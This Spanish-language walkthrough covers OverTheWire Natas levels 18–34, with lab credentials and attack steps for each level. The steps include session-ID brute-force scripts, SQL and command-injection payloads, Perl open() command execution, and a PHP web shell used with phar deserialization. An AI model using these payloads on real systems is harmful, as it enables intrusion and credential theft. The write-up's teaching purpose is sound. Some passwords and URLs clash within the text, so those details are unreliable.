**Acceso:** URL: http://natas18.natas.labs.overthewire.org

**Usuario:** natas18
**Contraseña:** 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

**Solución:**
Para llevar a cabo un ataque de secuestro de sesión, primero interceptamos el tráfico HTTP utilizando herramientas como Burp Suite para capturar la cookie PHPSESSID de la sesión. Iniciamos sesión sin proporcionar credenciales y luego revisamos las cookies enviadas con la solicitud.
Una vez que hemos capturado la cookie, la manipulamos utilizando Burp Suite:
En Burp, hacemos clic derecho sobre el paquete interceptado y lo enviamos a Intruder.
Seleccionamos el valor de la cookie PHPSESSID y configuramos el ataque de tipo Sniper.
Ajustamos el rango del payload para probar valores de ID de sesión entre 1 y 640, que es el valor máximo configurado en el código ($maxid).
En la pestaña de Payloads, configuramos el tipo de carga útil a Numbers y establecemos el rango de 1 a 640. Esto nos permitirá probar todos los posibles identificadores de sesión. Además, agregamos un Grep para identificar cuando la respuesta incluya el mensaje "You are an admin", lo que indica que hemos secuestrado correctamente la sesión de un administrador.
Después de configurar el ataque, lo lanzamos. Burp Suite probará cada valor de PHPSESSID hasta encontrar el que corresponda a la sesión de "admin". El ataque podría tardar un poco, ya que estamos probando múltiples IDs de sesión.
Cuando el ataque esté completo, revisamos la salida y buscamos la respuesta que contiene el mensaje "You are an admin". Esto indica que hemos encontrado la ID de sesión correcta. En este caso, el ID de sesión correspondiente al administrador es 610.
Una vez que tenemos la ID de sesión correcta, la copiamos y la usamos en Burp Repeater para asegurarnos de que funciona. Al enviar la solicitud con el PHPSESSID=610, obtenemos la respuesta con las credenciales para natas19:
```bash
Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```
Contraseña para el nivel 19: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr.

### Nivel 19

**Descripción:** En este nivel, la mecánica es similar al nivel anterior, pero esta vez la identificación de sesión (PHPSESSID) está codificada en hexadecimal. El objetivo sigue siendo obtener las credenciales para el siguiente nivel (natas20), pero para ello necesitamos descifrar y manipular la cookie PHPSESSID. La clave está en entender cómo se ha cambiado la codificación de la sesión y cómo aprovechar la vulnerabilidad para enumerar los posibles valores de sesión.

**Acceso:** URL: http://natas19.natas.labs.overthewire.org

**Usuario:** natas19
**Contraseña:** tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

**Solución:**
Para automatizar el ataque, creamos un script en Python que prueba todas las posibles sesiones. Aquí está el código:
```bash
#!/usr/bin/python
import requests
target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
trueStr = 'You are an admin.'
for x in range(1,641):
    if x % 10 == 0:
        print(str(x) + ' Sessions Tested')
    cookies = dict(PHPSESSID=(str(x)+'-admin').encode('hex'))
    r = requests.get(target, cookies=cookies)
    if r.content.find(trueStr) != -1:
        print('Got it!')
        print("Admin session is " + str(x))
        print(r.content)
        break
```
Al ejecutar el script, obtenemos los siguientes resultados:
```bash
10 Sessions Tested
20 Sessions Tested
30 Sessions Tested
---snip---
550 Sessions Tested
Got it!
Admin session is 595
```
El script encuentra que la sesión de admin corresponde al ID 595.
Una vez que obtenemos la sesión correcta, el contenido de la página nos muestra las credenciales para el siguiente nivel:
```bash
Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```
Contraseña para el nivel 20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw.

### Nivel 20

**Descripción:** Este nivel introduce un desafío relacionado con el manejo personalizado de sesiones en PHP mediante el uso de session_set_save_handler. El objetivo es iniciar sesión como "admin" y obtener las credenciales para el siguiente nivel (natas21). El reto consiste en manipular el manejo de sesiones para inyectar valores en la sesión que nos permitan escalar a un rol de administrador.

**Acceso:** URL: http://natas20.natas.labs.overthewire.org

**Usuario:** natas20
**Contraseña:** p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

**Solución:**
Usamos Burp Suite para interceptar la solicitud cuando se presiona el botón de "Change name". Esto nos permite modificar el valor del campo name y agregar un inyección de código.
Modificamos el campo name en la solicitud interceptada para que contenga:
```bash
%0Aadmin%201
```
Esto tiene el efecto de cambiar el nombre a "admin" y establecer el valor de admin a 1.
Una vez que modificamos el valor de la sesión, lo enviamos de vuelta al servidor usando Burp Suite en el Repeater.
Al hacer esto, logramos que el servidor guarde la siguiente información en el archivo de sesión:
```bash
name admin
admin 1
```
Esto establece la sesión como un administrador.
Al hacer este cambio, al visitar la página, la función print_credentials() detecta que la variable admin está establecida en 1 y muestra las credenciales para el siguiente nivel.
Las credenciales para el siguiente nivel son:
```bash
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```
Contraseña para el nivel 21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH.

### Nivel 21

**Descripción:** En este nivel, el objetivo es obtener el valor admin=1 en la variable $_SESSION para acceder a la bandera del siguiente nivel. Se nos presentan dos subdominios:
natas21.natas.labs.overthewire.org: Donde necesitamos admin=1 en la sesión.
natas21-experimenter.natas.labs.overthewire.org: Un sitio experimental que permite inyectar propiedades CSS, pero lo importante es manipular la sesión.

**Acceso:** URL: http://natas21.natas.labs.overthewire.org

**Usuario:** natas21
**Contraseña:** BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

**Solución:**
Usamos Burp Suite para interceptar una solicitud POST desde el formulario en el sitio experimental.
Añadimos &admin=1 al final de los datos del formulario.
```bash
POST /index.php HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
...
Content-Type: application/x-www-form-urlencoded
Content-Length: ...
align=center&fontsize=20&bgcolor=red&admin=1
```
Añadimos ?debug a la URL para verificar que admin=1 se guarde en la sesión.
```bash
URL modificada: http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug
```
Copiamos la cookie PHPSESSID modificada y la usamos en una solicitud GET al sitio natas21.
Accedemos a la contraseña de natas22 tras establecer la sesión con admin=1.
```bash
Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```
Contraseña para el nivel 22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz.

### Nivel 22

**Descripción:** En este nivel, al ingresar con las credenciales natas22 y chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ, nos encontramos con una interfaz de usuario en blanco. Al revisar el código fuente, vemos que si el parámetro revelio se incluye en la solicitud GET, se nos debe mostrar la contraseña. Sin embargo, cuando añadimos el parámetro revelio a la URL (por ejemplo, http://natas22.natas.labs.overthewire.org/index.php?revelio), la página sigue en blanco y no muestra la contraseña. Al investigar el código, encontramos una condición que verifica si el parámetro revelio está presente, pero si el valor de la variable $_SESSION no contiene admin=1, entonces el sistema realiza una redirección a la página principal (/).

**Acceso:** URL: http://natas22.natas.labs.overthewire.org

**Usuario:** natas22
**Contraseña:** d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

**Solución:**
La razón por la que no vemos la contraseña inmediatamente es que el servidor realiza una redirección a la página principal antes de que podamos ver el contenido.
Usando cURL sin seguir redirecciones: Puedes usar cURL con la opción -L deshabilitada para evitar que la solicitud sea redirigida. Esto permite interceptar el contenido de la respuesta antes de que la redirección ocurra:
```bash
curl -H 'Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==' http://natas22.natas.labs.overthewire.org/index.php?revelio
```
En Burp Suite, puedes interceptar la solicitud y observar el código de respuesta 302 (redirección). Puedes configurar Burp para reemplazar los códigos 302 por 200 para visualizar la página antes de la redirección.
Una vez que interceptamos y evitamos la redirección, obtenemos la contraseña.
```bash
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```
Contraseña para el nivel 23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs.

### Nivel 23

**Descripción:** En este nivel, utilizamos las credenciales del nivel anterior para iniciar sesión. Al revisar el código fuente de la aplicación, vemos que se utiliza la función strstr() para comparar la entrada del usuario con la contraseña. Sin embargo, el uso de strstr() para este propósito es problemático, ya que esta función devuelve true si encuentra una subcadena en una cadena dada. Esto significa que la función puede aceptar una entrada que contenga una parte de la contraseña en lugar de una coincidencia exacta, lo cual es un comportamiento inseguro. La función strstr() encontrará la primera ocurrencia de una subcadena dentro de la cadena. Si la contraseña comienza con un número y el usuario ingresa ese número como parte de su entrada, el script puede interpretar que la entrada es válida.

**Acceso:** URL: http://natas23.natas.labs.overthewire.org

**Usuario:** natas23
**Contraseña:** dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

**Solución:**
El problema principal aquí es que la aplicación permite que se encuentre una subcadena que coincida con la contraseña, en lugar de requerir una coincidencia exacta. Esto permite aprovechar el hecho de que si la contraseña comienza con un número, cualquier entrada que contenga ese número puede ser aceptada.
Sabemos que el inicio de la contraseña está compuesto por números, por lo que podemos hacer una prueba simple introduciendo solo los primeros números de la contraseña para que el script lo acepte.
En este caso, la contraseña para el siguiente nivel es: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd.
Puedes utilizar una subcadena como entrada para que coincida con los primeros caracteres de la contraseña.
Una vez que enviamos la entrada correcta, el sistema nos dará acceso al siguiente nivel.
Credenciales para el siguiente nivel:
```bash
Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```
Contraseña para el nivel 24: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd.

### Nivel 24

**Descripción:** En este nivel, utilizamos las credenciales obtenidas del nivel anterior para iniciar sesión. Al analizar el código fuente, encontramos que el script utiliza la función strcmp() para comparar dos cadenas. Sin embargo, el uso de esta función no está exento de debilidades, y es posible aprovechar estas debilidades para obtener acceso no autorizado.

**Acceso:** URL: http://natas24.natas.labs.overthewire.org

**Usuario:** natas24
**Contraseña:** MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

**Solución:**
La función strcmp() en PHP compara dos cadenas carácter por carácter. Sin embargo, el comportamiento de las comparaciones en PHP tiene algunas particularidades que pueden ser explotadas. En este caso, si manipulamos la solicitud para que $_GET['passwd'] se iguale a un array vacío, la función strcmp() devolverá NULL. Esto se debe a que strcmp() en PHP devolverá un valor distinto de cero si las cadenas son diferentes, pero en este caso devolvería NULL al compararlas con un array vacío.
Una particularidad importante de PHP es que cuando se compara NULL con 0, PHP considerará que ambos son equivalentes (esto se debe al comportamiento de conversión implícita de tipos en PHP). Así, si la función strcmp() devuelve NULL y se compara con 0, PHP lo interpretará como una comparación exitosa, lo que resultará en una validación correcta de la contraseña.
En lugar de enviar una contraseña válida, manipulamos la solicitud para enviar un valor vacío en $_GET['passwd'].
Esto hace que strcmp() compare el valor vacío con la contraseña y retorne NULL.
Debido al comportamiento de PHP, NULL == 0, lo que hace que la comparación sea considerada verdadera.
Al enviar una solicitud modificada, obtenemos acceso al siguiente nivel sin necesidad de proporcionar la contraseña correcta.
Credenciales para el siguiente nivel:
```bash
Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```
Contraseña para el nivel 25: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws.

### Nivel 25

**Descripción:** En este nivel, utilizamos las credenciales obtenidas del nivel anterior para iniciar sesión. Al revisar la página, observamos que ofrece la opción de seleccionar un idioma entre 'en' (inglés) y 'de' (alemán). Dependiendo de la selección, se muestra un contenido diferente.
Al inspeccionar el código fuente proporcionado, encontramos la función setLanguage(), que se encarga de inicializar el idioma seleccionado. Sin embargo, esta función tiene algunas características que pueden ser aprovechadas para ejecutar un ataque.

**Acceso:** URL: http://natas25.natas.labs.overthewire.org

**Usuario:** natas25
**Contraseña:** ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

**Solución:**
Explotación de $_SERVER['HTTP_USER_AGENT']: El valor de $_SERVER['HTTP_USER_AGENT'] no es verificado por la función safeinclude(), lo que nos permite manipularlo y enviar un payload malicioso. Si podemos inyectar código PHP en este campo, se puede ejecutar cuando el sistema registre el agente de usuario.
Para lograr la ejecución de código, podemos intentar enviar un payload PHP a través del campo HTTP_USER_AGENT, que será registrado en un archivo de log y podría ser ejecutado si el sistema incluye este valor sin las debidas comprobaciones de seguridad.
Al aprovechar la vulnerabilidad en $_SERVER['HTTP_USER_AGENT'], podemos inyectar un payload que se ejecute en el servidor, lo que nos permitirá obtener acceso al siguiente nivel.
Credenciales para el siguiente nivel:
```bash
Username: natas26
Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```
Contraseña para el nivel 26: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE.

### Nivel 26

**Descripción:** En este nivel, la página proporciona un formulario con cuatro entradas que permiten al usuario dibujar una línea y mantener el seguimiento de las líneas previamente dibujadas en la misma sesión, usando cookies para almacenar esta información. Al inspeccionar el código fuente, se identifican varios elementos que sugieren que el uso de funciones mágicas y la función unserialize() de PHP podrían ser un vector de ataque. Además, el uso de cookies con datos codificados en base64 también indica que se puede manipular la sesión y posiblemente ejecutar código malicioso.

**Acceso:** URL: http://natas26.natas.labs.overthewire.org

**Usuario:** natas26
**Contraseña:** cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

**Solución:**
El primer paso es decodificar la cookie que contiene los datos serializados en PHP. Esto se puede hacer fácilmente usando base64. Una vez decodificado, el siguiente paso es examinar el contenido serializado para entender la estructura de los datos.
Después de identificar la estructura de los datos, se puede crear un objeto malicioso que aproveche las funciones mágicas de PHP, como __wakeup(), __destruct(), o incluso la ejecución de código a través de métodos no controlados.
Utilizando un script en Python, el atacante puede automatizar el proceso de modificación de la cookie y enviar la solicitud con la cookie manipulada. El objetivo es inyectar un objeto malicioso en la sesión que luego se deserialice y ejecute el código deseado.
Una vez que se ha inyectado el objeto malicioso, se puede verificar si se ha ejecutado correctamente comprobando si el comportamiento de la aplicación ha cambiado, como acceder a un archivo de shell o recuperar el valor del siguiente nivel.
Después de realizar estos pasos, el atacante puede obtener la contraseña para el siguiente nivel, lo que indica que el ataque ha sido exitoso.
Credenciales para el siguiente nivel:
```bash
Username: natas27
Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
```
Contraseña para el nivel 27: u3RRffXjysjgwFU6b9xa23i6prmUsYne.

### Nivel 27

**Descripción:** En este nivel, al iniciar sesión se presenta un formulario con campos de nombre de usuario y contraseña. Si intentamos iniciar sesión con el nombre de usuario natas28 (que corresponde al siguiente nivel), se nos muestra un mensaje de "contraseña incorrecta". Sin embargo, si se intenta con cualquier nombre de usuario y contraseña aleatorios, se crea un nuevo usuario, y cuando se vuelve a iniciar sesión, se imprime la entrada SQL correspondiente con la contraseña de ese usuario.

**Acceso:** URL: http://natas27.natas.labs.overthewire.org

**Usuario:** natas27
**Contraseña:** u3RRffXjysjgwFU6b9xa23i6prmUsYne

**Solución:**
El objetivo es aprovechar la posibilidad de que un nombre de usuario largo (más de 64 caracteres) haga que el sistema cree dos entradas de usuario con el mismo nombre. Esto puede ser logrado enviando un nombre de usuario largo (que exceda el límite de 64 caracteres) y un valor de contraseña vacío.
Para facilitar el ataque, se puede utilizar Burp Suite para interceptar y modificar las solicitudes. Se debe capturar una solicitud normal al enviar el formulario de inicio de sesión y luego modificar la solicitud para que el nombre de usuario sea más largo que el límite de caracteres. Además, al no enviar ninguna contraseña, se puede aprovechar el hecho de que el sistema permitirá la creación de una entrada de usuario sin contraseña.
Después de modificar la solicitud y enviarla, el sistema crea un nuevo usuario con el nombre de usuario truncado. Luego, se puede iniciar sesión con el nombre de usuario natas28 (sin necesidad de una contraseña), lo que dará acceso a las credenciales del siguiente nivel.
Tras ejecutar estos pasos, el atacante logra acceder al siguiente nivel con el nombre de usuario natas28 y sin necesidad de una contraseña, lo que permite obtener la contraseña para el siguiente nivel.
Credenciales para el siguiente nivel:
```bash
Username: natas28
Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
```
Contraseña para el nivel 28: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj .

### Nivel 28

**Descripción:** En este nivel, se nos presenta un formulario con un campo de búsqueda similar a lo que hemos visto en niveles anteriores, pero esta vez con una pequeña variación: el formulario se conecta a una base de datos y nos permite realizar búsquedas. Sin embargo, al intentar inyectar un simple SQL ('), nos damos cuenta de que la aplicación parece estar manejando de alguna forma la entrada para evitar la inyección SQL directa.
Cuando se envía una consulta POST, se nos redirige a una página search.php, y se agrega una cadena de consulta extremadamente larga a la URL. Al examinar la URL, descubrimos que está utilizando una cadena codificada en base64.

**Acceso:** URL: http://natas28.natas.labs.overthewire.org

**Usuario:** natas28
**Contraseña:** 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj 

**Solución:**
Primero, inyectamos una consulta SQL que obtenga todas las contraseñas de la base de datos:
```bash
' UNION SELECT ALL password FROM users; -- 
```
Codificación Base64 y URL Encoding: Luego, la entrada generada en la búsqueda se codifica en base64 y se convierte en una URL válida con codificación URL (%2F, %3D, etc.).
Utilizamos CyberChef para decodificar la cadena base64 y, tras realizar varias manipulaciones (como cambiar bloques y ajustar los resultados), obtenemos la contraseña en texto plano.
Después de realizar todas las manipulaciones, obtenemos la contraseña del siguiente nivel.
Credenciales para el siguiente nivel:
```bash
Username: natas29
Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```
Contraseña para el nivel 29: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns.

### Nivel 29

**Descripción:** En este nivel, se nos presenta una página que contiene un menú desplegable, y nos pide realizar alguna acción para descubrir el flag. Aunque la página está llena de jerga "l33t-speak", la tarea principal es averiguar cómo manipular el menú para obtener el archivo que contiene el flag, siguiendo el patrón de los niveles anteriores.

**Acceso:** URL: http://natas29.natas.labs.overthewire.org

**Usuario:** natas29
**Contraseña:** 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

**Solución:**
Al entrar en la página, encontramos que el menú desplegable nos permite seleccionar diferentes opciones. El menú carga diferentes nombres de archivo, pero no está claro de inmediato cómo manipularlos para obtener el archivo deseado.
Al intentar usar el clic derecho para inspeccionar el contenido, descubrimos que la opción está deshabilitada. Sin embargo, al ver el código fuente, no obtenemos ninguna pista clara de cómo obtener el archivo.
En este nivel, sabemos que la aplicación permite la inyección de comandos, lo que nos da una pista sobre cómo interactuar con el sistema subyacente. Al comprender cómo los comandos pueden ser inyectados y ejecutados en el sistema, intentamos manipular el menú para cargar un archivo de nuestra elección, siguiendo el patrón de las rutas de archivo vistas en niveles anteriores.
Sabemos que los archivos relacionados con el flag suelen estar en rutas como /etc/natas_webpass/. Usamos la inyección de comandos para intentar cargar el archivo natas30, que se encuentra en esa carpeta siguiendo el patrón anterior. La manipulación de la cadena en el menú desplegable permite que se ejecute el comando para leer el archivo deseado.
Para hacer esto, modificamos la ruta para cambiar un carácter en cada "natas" por un ?:
```bash
cat /etc/n?tas_webpass/n?tas30 %00
```
Este comando lee el archivo natas30 que contiene la contraseña del siguiente nivel.
Al ejecutar el comando, obtenemos la contraseña:
```bash
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```
Contraseña para el nivel 30: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH.

### Nivel 30

**Descripción:** En este nivel, nos enfrentamos a un desafío en Perl con una página de inicio de sesión. El código fuente de la página está disponible y nos da pistas sobre cómo interactuar con la base de datos. El reto consiste en encontrar una vulnerabilidad en el código para obtener la contraseña del siguiente nivel.

**Acceso:** URL: http://natas30.natas.labs.overthewire.org

**Usuario:** natas30
**Contraseña:** WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

**Solución:**
El código Perl que nos proporcionan hace lo siguiente:
Si el método de la solicitud es POST y la solicitud incluye un nombre de usuario y una contraseña, se establece una conexión a la base de datos.
Se forma una consulta SQL utilizando $dbh->quote(param()), lo que sugiere que los parámetros son seguros (usando la función quote() para escapar los valores).
Si la consulta devuelve algún resultado, se imprime; de lo contrario, se muestra un mensaje de "fail :(".
La idea de que la base de datos es vulnerable a SQL injection parece interesante, pero al intentar inyectar cadenas comunes como ' OR 1=1 --, no obtenemos ningún resultado útil, lo que indica que probablemente la función quote() está escapando correctamente los parámetros para evitar ataques de inyección SQL directos.
A pesar de que las inyecciones tradicionales no funcionan, el código aún puede tener otras vulnerabilidades. Para resolver este desafío, necesitamos encontrar una "vulnerabilidad no obvia".Después de investigar un poco más, descubrimos que el parámetro password puede ser manipulado de una manera inusual. En lugar de simplemente pasar un valor de cadena, podemos enviar un array para el parámetro de la contraseña.
Al enviar el parámetro password como un array (por ejemplo, ["'whatever' or 1", 4]), la función quote() trata cada elemento del array de una manera inesperada, lo que permite que una inyección de SQL funcione.
Utilizando el script de Python y la biblioteca requests, podemos enviar una solicitud POST con los parámetros modificados para ejecutar la inyección:
```bash
import requests
from requests.auth import HTTPBasicAuth
# Credenciales de autenticación básica
basicAuth = HTTPBasicAuth('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')
# URL del nivel
u = "http://natas30.natas.labs.overthewire.org/index.pl"
# Parámetros de la solicitud
params = {"username": "natas28", "password": ["'whatever' or 1", 4]}
# Realizamos la solicitud POST
response = requests.post(u, data=params, auth=basicAuth, verify=False)
# Imprimimos la respuesta que contiene el flag
print(response.text)
```
El resultado de la ejecución del script contiene el flag de natas31, que es:
```bash
m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
```
Contraseña para el nivel 31: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y.

### Nivel 31

**Descripción:** En este nivel, se nos presenta un formulario en el que podemos cargar archivos CSV. La carga de archivos parece ser procesada de una manera que puede ser explotada, y el reto consiste en encontrar una forma de leer un archivo específico en el servidor (probablemente el archivo que contiene la contraseña para el siguiente nivel).

**Acceso:** URL: http://natas31.natas.labs.overthewire.org

**Usuario:** natas31
**Contraseña:** m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

**Solución:**
La página permite a los usuarios cargar archivos CSV, y luego muestra su contenido en una tabla bien formateada en la página. Además, se proporciona el código fuente de la página, lo que nos da pistas sobre cómo funciona el sistema.
El código permite cargar archivos y los procesa de alguna manera utilizando el parámetro ARGV, que es un mecanismo de acceso a los argumentos de la línea de comandos en Perl.
Sabemos que la variable ARGV se puede usar para pasar parámetros a un script Perl, lo que significa que si manipulamos la entrada adecuadamente, podemos hacer que el script cargue cualquier archivo que queramos, como por ejemplo /etc/natas_webpass/natas32, que contiene la contraseña para el siguiente nivel.
Solución de solo lectura:
El primer paso es manipular el formulario de carga de archivos para incluir un bloque de datos form-data antes de los datos del archivo CSV real. Esto se puede hacer copiando y pegando uno de los bloques de datos form-data existentes y luego añadiendo la variable ARGV justo antes del archivo que deseamos cargar.
Esto hace que Perl procese el primer descriptor de archivo que recibe como si fuera el archivo que estamos intentando abrir.
Para acceder al archivo deseado (en este caso /etc/natas_webpass/natas32), necesitamos agregar el parámetro ?filename al final de la URL. Así, le indicamos al servidor que abra ese archivo específico. La URL final debería verse algo así:
```bash
/index.pl?filename=/etc/natas_webpass/natas32

```
Al realizar estas modificaciones, el archivo CSV se carga correctamente y se obtiene el contenido del archivo /etc/natas_webpass/natas32, que es la contraseña para el siguiente nivel.
```bash
NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
```
Contraseña para el nivel 32: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B.

### Nivel 32

**Descripción:** En este nivel, se nos presenta una página web casi idéntica a la del nivel anterior, con la única diferencia de que ahora se menciona explícitamente que necesitamos ejecutar código en el servidor. Para ello, necesitamos encontrar una forma de ejecutar comandos en el servidor utilizando la carga de archivos CSV, similar a lo que hicimos en el nivel anterior, pero con un enfoque diferente.

**Acceso:** URL: http://natas32.natas.labs.overthewire.org

**Usuario:** natas32
**Contraseña:** NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

**Solución:**
Primero, creamos un archivo CSV de prueba con contenido como el siguiente:
```bash
1,2,
3,4,
```
Guardamos este archivo como test.csv.
Abrimos Burp Suite y configuramos un proxy para interceptar todo el tráfico HTTP.
Subimos el archivo test.csv a la página web a través del formulario de carga de archivos.
Capturamos la solicitud en la pestaña Proxy > History.
Hacemos clic derecho en la solicitud capturada y seleccionamos Send to Repeater.
En la pestaña Repeater, la solicitud se verá algo así como una solicitud de formulario multipart.
Aquí es donde hacemos dos modificaciones importantes:
a. Modificar los datos del formulario:
Copiamos uno de los bloques de datos form-data que aparece en la solicitud original.
Modificamos este bloque para enviar un archivo adicional con el contenido ARGV. Esto hará que el script Perl procese este valor y lo use en el parámetro open() para ejecutar comandos.
Asegúrate de que los números de límite (boundary) sean consistentes en todo el formulario.
b. Proveer los valores en la URL:
Al final de la URL (en /index.pl), agregamos un signo de interrogación ? seguido del comando que queremos ejecutar.
En este caso, intentamos ejecutar el comando ls, pero necesitamos agregar un | al final para asegurar que el comando se ejecute correctamente.
La URL final debería verse algo como:
```bash
/index.pl?ls%20.%20|
```
Enviamos la solicitud modificada usando Burp Suite, y si todo está configurado correctamente, el servidor ejecutará el comando ls, mostrándonos el contenido del directorio actual.
Al ejecutar el comando ls, encontramos que hay un archivo llamado getpassword.
Ahora, modificamos la solicitud para ejecutar este archivo en lugar de solo listar el contenido de los directorios:
```bash
/index.pl?./getpassword%20|
```
Después de ejecutar el comando, obtenemos la contraseña que necesitamos para avanzar al siguiente nivel.
```bash
2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
```
Contraseña para el nivel 33: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ.

### Nivel 33

**Descripción:** Este nivel involucra la carga de archivos “firmware” en forma de archivos PHP y la ejecución de esos archivos si tienen un hash MD5 específico. La solución se basa en manipular el comportamiento de la carga y ejecución de archivos para que podamos ejecutar nuestro propio código PHP en el servidor.

**Acceso:** URL: http://natas33.natas.labs.overthewire.org

**Usuario:** natas33
**Contraseña:** 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ

**Solución:**
Crear el archivo shell.php: Este archivo PHP contendrá el código que queremos ejecutar en el servidor. Por ejemplo, el archivo puede ser un simple <?php system($_GET['cmd']); ?>, lo que nos permitirá ejecutar comandos remotos.
Configura Burp Suite para interceptar el tráfico entre el navegador y el servidor.
Usa tu navegador para subir shell.php.
En Burp Suite, encuentra la solicitud en Proxy > History.
Haz clic derecho sobre la solicitud y selecciona Send to Repeater.
En el Repeater, modifica el nombre del archivo de acuerdo con el nombre de archivo PHPSESSID generado por el servidor a shell.php, para asegurarnos de que el archivo cargado se llame como el que deseamos.
Haz clic en "Go" para enviar la solicitud y subir el archivo shell.php.

Crear el archivo natas.phar: Un archivo Phar (PHP Archive) es un formato de archivo que permite empaquetar múltiples archivos en uno solo. Debemos crear un archivo Phar que contenga un archivo test.txt con contenido ficticio.
Usando el navegador, sube el archivo natas.phar.
En Burp Suite, encuentra la solicitud de subida del archivo y envíala al Repeater.
Modifica el nombre del archivo en la solicitud a natas.phar.
Haz clic en "Go" para enviar la solicitud y subir el archivo Phar.

La idea es hacer que el sistema procese el archivo Phar para intentar extraer el archivo test.txt. Sin embargo, el archivo no existe, lo que provoca que el proceso de deserialización manipule las variables $filename y $signature.
El valor de $signature se verá modificado gracias a esta manipulación, permitiendo que coincida con el valor esperado (adeafbadbabec0dedabada55ba55d00d), lo que provocará la ejecución del archivo shell.php.
En Burp Suite, toma la solicitud desde la subida del archivo Phar y modifica la URL para que sea algo como:
```bash
/index.pl?phar://natas.phar/test.txt
```
Esto provocará que el sistema procese el archivo Phar y active la deserialización.
Luego de realizar la manipulación, haz clic en "Go" para enviar la solicitud.
El sistema procesará el archivo Phar, lo que desencadenará la ejecución del archivo PHP shell.php debido a la modificación de $signature y $filename.
Si todo se ha hecho correctamente, recibirás la contraseña como resultado.
```bash
j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```
Contraseña para el nivel 34: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY.

### Nivel 34

**Acceso:** URL: http://natas34.natas.labs.overthewire.org

**Usuario:** natas34
**Contraseña:** j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY

**Contenido del mensaje:** Congratulations! You have reached the end... for now.
